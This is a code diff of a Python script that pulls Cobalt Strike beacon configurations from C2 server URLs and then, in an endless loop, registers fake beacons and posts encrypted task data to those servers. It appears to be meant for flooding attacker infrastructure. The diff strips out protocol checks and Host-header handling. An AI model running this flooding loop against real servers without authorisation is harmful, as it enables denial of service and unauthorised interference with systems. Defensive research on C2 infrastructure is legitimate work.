@@ -16,7 +16,6 @@ import hmac
 import urllib
 import socket
 from comm import *
-import re
 
 HASH_ALGO = hashlib.sha256
 SIG_SIZE = HASH_ALGO().digest_size
@@ -24,8 +23,6 @@ CS_FIXED_IV = b"abcdefghijklmnop"
 
 EMPTY_UA_HEADERS = {"User-Agent":""}
 URL_PATHS = {'x86':'ab2g', 'x64':'ab2h'}
-
-sent_beacons = 0
 
 def get_beacon_data(url, arch):
     full_url = urljoin(url, URL_PATHS[arch])
@@ -76,27 +73,17 @@ def register_beacon(conf):
         conf (dict): Beacon configuration dict, from cobaltstrikeConfig parser
     """
     # Register new random beacon
-    if conf['BeaconType'][0] == 'HTTP' or conf['BeaconType'][0] == 'HTTPS':
-        pass
-    else:
-        print("BeaconType " + str(conf['BeaconType']) + " not yet supported! Quitting.")
-        return
-
+    urljoin('http://'+conf['C2Server'].split(',')[0], conf['C2Server'].split(',')[1])
     aes_source = os.urandom(16)
-    m = Metadata(conf['PublicKey'], aes_source, str(conf['Spawnto_x64']))
+    m = Metadata(conf['PublicKey'], aes_source)
     t = Transform(conf['HttpGet_Metadata'])
-
     body, headers, params = t.encode(m.pack().decode('latin-1'), '', str(m.bid))
 
-    if ( 'HostHeader' in conf):
-        domain = re.search('Host: (.*)$', conf['HostHeader'], re.I)
-        if domain :
-            headers['Host'] = domain.group(1).strip()
-    print('[+] Registering new random beacon: comp=%s user=%s url=%s' % (m.comp, m.user, urljoin(conf['BeaconType'][0]+'://'+conf['C2Server'].split(',')[0]+':'+str(conf['Port']), conf['C2Server'].split(',')[1])))
+    print('[+] Registering new random beacon: comp=%s user=%s url=%s' % (m.comp, m.user, conf['C2Server']))
     try:
-        req = requests.request('GET', urljoin(conf['BeaconType'][0]+'://'+conf['C2Server'].split(',')[0]+':'+str(conf['Port']), conf['C2Server'].split(',')[1]), verify=False, params=params, data=body, headers=dict(**headers, **{'User-Agent':''}), timeout=5)
+        req = requests.request('GET', urljoin('http://'+conf['C2Server'].split(',')[0], conf['C2Server'].split(',')[1]), params=params, data=body, headers=dict(**headers, **{'User-Agent':''}), timeout=5)
     except Exception as e:
-        print('[-] Got exception from server: %s' % e)
+        print('[-] Got excpetion from server: %s' % e)
         return
 
     # This is how to properly encrypt a task:
@@ -119,23 +106,23 @@ def register_beacon(conf):
     t = Transform(conf['HttpPost_Metadata'])
     body, headers, params = t.encode(m.pack().decode('latin-1'), enc_data.decode('latin-1'), str(m.bid))
 
-    if ( 'HostHeader' in conf):
-        domain = re.search('Host: (.*)$', conf['HostHeader'], re.I)
-        if domain :
-            headers['Host'] = domain.group(1).strip()
-
-    global sent_beacons
-    print('[' + str(sent_beacons) + '] Sending task data')
-
+    print('[+] Sending task data')
+    
     try:
-        req = requests.request('POST', urljoin(conf['BeaconType'][0]+'://'+conf['C2Server'].split(',')[0]+':'+str(conf['Port']), conf['HttpPostUri'].split(',')[0]), verify=False, params=params, data=body, headers=dict(**headers, **{'User-Agent':''}), timeout=5)
-        print('[Response code: ' + str(req.status_code) + ']')
-        sent_beacons = sent_beacons + 1
+        req = requests.request('POST', urljoin('http://'+conf['C2Server'].split(',')[0], conf['HttpPostUri'].split(',')[0]), params=params, data=body, headers=dict(**headers, **{'User-Agent':''}), timeout=5)
     except Exception as e:
-        print('[-] Got exception from server while sending task: %s' % e)
+        print('[-] Got excpetion from server while sending task: %s' % e)
 
 
-if __name__ == '__main__':   
+
+if __name__ == '__main__':
+    '''
+    parser = argparse.ArgumentParser(description="Parse CobaltStrike Beacon's configuration from C2 url and registers a beacon with it")
+    #parser.add_argument('source', choices=('url', 'file'))
+    parser.add_argument("url", help="Cobalt C2 server (e.g. http://1.1.1.1)", required=False)
+    parser.add_argument("file", help="Text file with list of Cobalt C2 servers - One server per line")
+    args = parser.parse_args()
+    '''
     parser = argparse.ArgumentParser()
     group = parser.add_mutually_exclusive_group()
     group.add_argument("-u", "--url")
@@ -166,17 +153,16 @@ if __name__ == '__main__':
         with f:
             reader = f.readlines()
             for line in reader:
-                if line[0] != '#':
-                    print("[*] Now testing " + line.replace("\n",""))
-                    x86_beacon_conf = get_beacon_data(line, 'x86')
-                    x64_beacon_conf = get_beacon_data(line, 'x64')
-                    if not x86_beacon_conf and not x64_beacon_conf:
-                        print("[-] Failed finding any beacon configuration")
-                    else:
-                        print("[+] Got beacon configuration successfully")
-                        conf = x86_beacon_conf or x64_beacon_conf
-                        confs.append(conf)
+                print(line)
+                x86_beacon_conf = get_beacon_data(line, 'x86')
+                x64_beacon_conf = get_beacon_data(line, 'x64')
+                if not x86_beacon_conf and not x64_beacon_conf:
+                    print("[-] Failed finding any beacon configuration")
+                else:
+                    print("[+] Got beacon configuration successfully")
+                    conf = x86_beacon_conf or x64_beacon_conf
+                    confs.append(conf)
 
-            while (1==1):
-                for c in confs:
-                    register_beacon(c)
+        while (1 == 1):
+            for c in confs:
+                register_beacon(c)
